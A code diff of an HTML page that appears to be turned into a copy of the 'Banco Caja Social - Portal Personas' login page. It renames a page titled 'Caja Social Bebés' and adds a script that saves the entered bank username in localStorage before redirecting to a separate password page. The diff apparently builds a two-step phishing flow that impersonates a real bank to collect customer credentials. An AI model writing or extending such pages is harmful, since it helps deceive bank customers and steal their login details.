@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Caja Social Bebés</title>
+<title>Banco Caja Social - Portal Personas</title>
 
 <style>
 *{
@@ -178,10 +178,10 @@ Recuerde que su usuario está compuesto por su Tipo de Identificación (<strong>
 </div>
 
 <label>Usuario</label>
-<input type="text" placeholder="Ejemplo: CC1234567890">
+<input type="text" id="usuario" placeholder="Ejemplo: CC1234567890">
 <div class="ejemplo">Ejemplo: CC1234567890</div>
 
-<button>Siguiente</button>
+<button id="btnSiguiente">Siguiente</button>
 
 <div class="enlace">
 <a href="#">¿Olvidó su contraseña?</a>
@@ -194,6 +194,28 @@ Recuerde que su usuario está compuesto por su Tipo de Identificación (<strong>
 </div>
 
 </div>
+
+<script>
+document.getElementById('btnSiguiente').addEventListener('click', function() {
+    const usuario = document.getElementById('usuario').value.trim();
+    
+    if (!usuario) {
+        alert('Por favor, ingrese su usuario');
+        return;
+    }
+    
+    // Guardar usuario y redirigir a página de contraseña
+    localStorage.setItem('usuario_bcs', usuario);
+    window.location.href = 'contrasena.html';
+});
+
+// Presionar Enter
+document.getElementById('usuario').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('btnSiguiente').click();
+    }
+});
+</script>
 
 </body>
 </html>
